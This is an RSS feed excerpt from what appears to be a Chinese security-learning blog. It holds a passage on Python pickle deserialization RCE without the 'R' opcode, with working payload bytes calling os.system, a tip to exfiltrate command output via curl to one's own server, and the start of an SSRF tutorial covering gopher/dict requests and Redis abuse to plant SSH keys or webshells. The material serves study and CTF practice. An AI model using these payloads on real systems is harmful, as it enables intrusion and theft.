&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import blue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def check(data):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if b&amp;#x27;R&amp;#x27; in data:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return &amp;#x27;no reduce!&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = pickle.loads(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (x != Student(blue.name, blue.grade)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return &amp;#x27;not equal&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return f&amp;#x27;well done now blue.grade=&amp;#123;blue.grade&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(check(base64.b64decode(input())))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;使用build指令rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用build指令rce&#34;&gt;#&lt;/a&gt; 使用 build 指令 rce&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;__reduce__&lt;/code&gt; 与 &lt;code&gt;R&lt;/code&gt;  指令是绑定的，禁止了 &lt;code&gt;R&lt;/code&gt;  指令就禁止了 &lt;code&gt;__reduce__&lt;/code&gt;  方法。那么，在禁止 &lt;code&gt;R&lt;/code&gt;  指令的情况下，我们还能 RCE 吗？&lt;/p&gt;
&lt;p&gt;现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用 &lt;code&gt;fun(arg)&lt;/code&gt; ，其中 &lt;code&gt;fun&lt;/code&gt;  和 &lt;code&gt;arg&lt;/code&gt;  都必须可控。&lt;/p&gt;
&lt;p&gt;审 pickle 源码，来看看 BUILD 指令（指令码为 &lt;code&gt;b&lt;/code&gt; ）是如何工作的：&lt;/p&gt;
&lt;p&gt;这里的实现方式也就是上文的注所提到的：如果 &lt;code&gt;inst&lt;/code&gt;  拥有 &lt;code&gt;__setstate__&lt;/code&gt; 方法，则把 &lt;code&gt;state&lt;/code&gt;  交给 &lt;code&gt;__setstate__&lt;/code&gt; 方法来处理；否则的话，直接把 &lt;code&gt;state&lt;/code&gt;  这个 &lt;code&gt;dist&lt;/code&gt;  的内容，合并到 &lt;code&gt;inst.__dict__ &lt;/code&gt; 里面。&lt;/p&gt;
&lt;p&gt;通过 BUILD 指令与 C 指令的结合，我们可以把改写为 &lt;code&gt;os.system&lt;/code&gt;  或其他函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Student&lt;/code&gt;  原先是没有 &lt;code&gt;__setstate__&lt;/code&gt; 这个方法的。那么我们利用 &lt;code&gt;&amp;#123;&#39;__setstate__&#39;: os.system&amp;#125;&lt;/code&gt;  来 BUILD 这个对象，那么现在对象的 &lt;code&gt;__setstate__&lt;/code&gt; 就变成了 &lt;code&gt;os.system&lt;/code&gt; ；接下来利用 &lt;code&gt;&amp;quot;ls /&amp;quot;&lt;/code&gt;  来再次 BUILD 这个对象，则会执行 &lt;code&gt;setstate(&amp;quot;ls /&amp;quot;)&lt;/code&gt;  ，而此时 &lt;code&gt;__setstate__&lt;/code&gt; 已经被我们设置为 &lt;code&gt;os.system&lt;/code&gt; ，因此实现了 RCE.&lt;/p&gt;
&lt;p&gt;payload 构造如下：&lt;/p&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;\x80\x03c__main__\nStudent\n)\x81&amp;#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-5f6f6661a916b296e3fac6fbed8427cc_720w.webp&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;有一个可以改进的地方：这份 payload 由于没有返回一个 Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常 Student 进栈。payload 构造如下：&lt;/p&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;\x80\x03c__main__\nStudent\n)\x81&amp;#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStu&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-fd188e8d3e3f341d719019b7e869bf9d_720w.webp&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;具体构造 payload 的方法：&lt;/p&gt;
&lt;p&gt;假设我们有一个 flag 类&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class flag():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_flag = pickle.dumps(flag(),protocol=3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(new_flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickletools.dis(new_flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# your_payload = b&amp;#x27;?&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# other_flag = pickle.loads(your_payload)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81q\x01.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0: \x80 PROTO      3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    2: c    GLOBAL     &amp;#x27;__main__ flag&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   17: q    BINPUT     0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   19: )    EMPTY_TUPLE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   20: \x81 NEWOBJ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   21: q    BINPUT     1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   23: .    STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highest protocol among opcodes = 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据 BUILD 的说明，我们需要构造一个字典&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81&amp;#125;.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来往字典里放值，先放一个 mark&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81&amp;#125;(.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;放键值对&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81&amp;#125;(V__setstate__\ncos\nsystem\nu.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一次 BUILD&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81&amp;#125;(V__setstate__\ncos\nsystem\nub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;放参数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81&amp;#125;(V__setstate__\ncos\nsystem\nubVwhoami\n.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第二次 BUILD&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81&amp;#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;完成&lt;/p&gt;
&lt;p&gt;一些补充的细节&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;一&lt;/strong&gt;、** 其他模块的 load 也可以触发 pickle 反序列化漏洞。** 例如： &lt;code&gt;numpy.load()&lt;/code&gt;  先尝试以 numpy 自己的数据格式导入；如果失败，则尝试以 pickle 的格式导入。因此 &lt;code&gt;numpy.load()&lt;/code&gt;  也可以触发 pickle 反序列化漏洞。&lt;/p&gt;
&lt;p&gt;二、即使代码中没有 &lt;code&gt;import os&lt;/code&gt; ，&lt;strong&gt;GLOBAL 指令也可以自动导入 &lt;code&gt;os.system&lt;/code&gt; &lt;/strong&gt;。因此，不能认为 “我不在代码里面导入 os 库，pickle 反序列化的时候就不能执行 os.system”。&lt;/p&gt;
&lt;p&gt;三、** 即使没有回显，也可以很方便地调试恶意代码。** 只需要拥有一台公网服务器，执行 &lt;code&gt;os.system(&#39;curl your_server/&lt;/code&gt; ls / | base64 &lt;code&gt;)&lt;/code&gt; ，然后查询您自己的服务器日志，就能看到结果。这是因为：以 ``` 引号包含的代码，在 sh 中会直接执行，返回其结果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI2NDM2My5odG1s&#34;&gt;Python pickle 反序列化详解 - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84OTEzMjc2OA==&#34;&gt;从零开始 python 反序列化攻击：pickle 原理解析 &amp;amp; 不用 reduce 的 RCE 姿势 - 知乎 (zhihu.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9taXNha2lrYXRhLmdpdGh1Yi5pby8yMDIwLzA0L3B5dGhvbi0lRTUlOEYlOEQlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYv&#34;&gt;python 反序列化～Misaki’s Blog (misakikata.github.io)&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/27/SSRF/</guid>
            <title>SSRF</title>
            <link>http://example.com/2022/06/27/SSRF/</link>
            <pubDate>Mon, 27 Jun 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识&lt;/h3&gt;
&lt;h4 id=&#34;1dict协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1dict协议&#34;&gt;#&lt;/a&gt; 1.dict 协议&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。可以看到用这个协议架设的服务可以用 telnet 来登陆，说明这个协议应该是基于 tcp 协议开发的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;telnet dict.org 2628&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325164738004.png&#34; alt=&#34;image-20220325164738004&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们输入  &lt;code&gt;define [字典名] [单词]&lt;/code&gt;  这样的命令来获取一个单词的解释&lt;/p&gt;
&lt;p&gt;比如说  &lt;code&gt;define english hello&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;服务器就会返回对应的单词解释&lt;/p&gt;
&lt;p&gt;对弈一些 &lt;code&gt;tcp&lt;/code&gt;  协议，用 &lt;code&gt;dict&lt;/code&gt;  方法可以打开，在有 &lt;code&gt;waf&lt;/code&gt;  的情况下可以获取一些开放的服务信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 文件名: main.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$url = &amp;quot;dict://localhost:3306&amp;quot;; // localhost:3306 上架设了我的 mysql 服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ch = curl_init($url);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl_exec($ch);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl_close($ch);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;N 5.5.62-log=gnsw|+\��!�n5[KF\&amp;#123;wdo&amp;quot;Umysql_native_password!��#08S01Got packets out of order1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配合 burpsuite 可以进行端口扫描&lt;/p&gt;
&lt;h4 id=&#34;gopher协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gopher协议&#34;&gt;#&lt;/a&gt; gopher 协议&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;gopher&lt;/code&gt;  协议是一种信息查找系统，他将 &lt;code&gt;Internet&lt;/code&gt;  上的文件组织成某种索引，方便用户从 &lt;code&gt;Internet&lt;/code&gt;  的一处带到另一处。在 &lt;code&gt;WWW&lt;/code&gt;  出现之前， &lt;code&gt;Gopher&lt;/code&gt;  是 &lt;code&gt;Internet&lt;/code&gt;  上最主要的信息检索工具，Gopher 站点也是最主要的站点，使用 &lt;code&gt;tcp70&lt;/code&gt;  端口。但在 &lt;code&gt;WWW&lt;/code&gt;  出现后， &lt;code&gt;Gopher&lt;/code&gt;  失去了昔日的辉煌。现在它基本过时，人们很少再使用它。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gopher&lt;/code&gt;  协议格式: &lt;code&gt;gopher://IP:port/_&amp;#123;TCP/IP数据流&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;gopher 可以接收 get 和 post 请求&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl gopher://192.168.109.166:80/_GET%20/get.php%3fparam=Konmu%20HTTP/1.1%0d%0aHost:192.168.109.166%0d%0a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl gopher://192.168.194.1:80/_POST%20/post.php%20HTTP/1.1%0d%0AHost:192.168.194.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname=purplet%0d%0A&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ssrf + gopher 可以实现 Redis 未授权访问&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST与GET传参的区别：它有4个参数为必要参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;POST /post.php HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;host:192.168.194.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type:application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length:12name=purplet&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ssrf-redis-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf-redis-未授权访问&#34;&gt;#&lt;/a&gt; ssrf + Redis 未授权访问&lt;/h3&gt;
&lt;p&gt;攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作&lt;/p&gt;
&lt;p&gt;攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器。&lt;/p&gt;
&lt;p&gt;简单说，漏洞的产生条件有以下两点:&lt;/p&gt;
&lt;p&gt;（1）redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；&lt;br&gt;
（2）没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。&lt;/p&gt;
&lt;p&gt;1. 启动 redis&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;可以指定配置文件启动(若不指定则以默认的配置文件启动)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./redis-server /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;安全模式起作用需要同时满足俩个条件：&lt;/p&gt;
&lt;p&gt;(1) redis 没有开启登录认证&lt;/p&gt;
&lt;p&gt;(2) redis 没有绑定到某个 ip 地址或 ip 段&lt;/p&gt;
&lt;p&gt;redis 默认是未开启登录认证，开启安全模式的.&lt;/p&gt;
&lt;p&gt;造成未授权访问有两种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;未开启登录验证，并且把 IP 绑定到 0.0.0.0&lt;/li&gt;
&lt;li&gt;未开启登录验证，没有设置绑定 IP， &lt;code&gt;protected-mode&lt;/code&gt;  关闭&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;利用redis写webshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用redis写webshell&#34;&gt;#&lt;/a&gt; 利用 Redis 写 webshell&lt;/h4&gt;
&lt;p&gt;通过设置目录后写入备份文件中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20180829154920415-7768410.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
